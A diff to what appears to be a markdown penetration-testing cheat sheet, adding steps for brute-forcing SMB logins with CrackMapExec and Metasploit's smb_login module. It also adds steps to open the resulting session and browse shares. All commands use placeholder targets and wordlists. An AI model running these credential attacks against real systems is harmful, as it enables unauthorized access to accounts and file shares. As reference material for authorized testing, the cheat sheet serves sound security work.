@@ -1610,7 +1610,7 @@ hydra -L <USER_LIST> -P <PASSWORD_LIST> -V <TARGET_IP> smb
 
 > The username and password fields can be just a string or a wordlist file.
 
-**CrackMapExec - SMB**
+**OPTION 1: CrackMapExec - SMB**
 
 ```bash
 crackmapexec smb <TARGET_IP> -u <USER_LIST> -p <PASSWORD_LIST>
@@ -1618,19 +1618,34 @@ crackmapexec smb <TARGET_IP> -u <USER_LIST> -p <PASSWORD_LIST>
 
 > The username and password fields can be just a string or a wordlist file.
 
-**Metaploit - SMB**
+**OPTION 2: Metaploit - SMB**
 
 ```bash
-msfconsole -q
+sudo msfconsole -q
 
 msf6 > use auxiliary/scanner/smb/smb_login
 msf6 > options
 msf6 > set USER_FILE <USER_LIST>
 msf6 > set PASS_FILE <PASSWORD_LIST>
 msf6 > set RHOSTS <TARGET_IP>
+msf6 > set STOP_ON_SUCCESS true
+msf6 > set CreateSession true
 
 msf6 > run
 ```
+
+If valid credentials credentials were found, a session is created
+
+```bash
+msf6 > sessions
+
+msf6 > sessions -i <SESSION_ID>
+
+SMB (<TARGET_IP>) > shares
+
+SMB (<TARGET_IP>) > shares -i <SHARE_ID>
+```
+
 
 2. List Shares
 
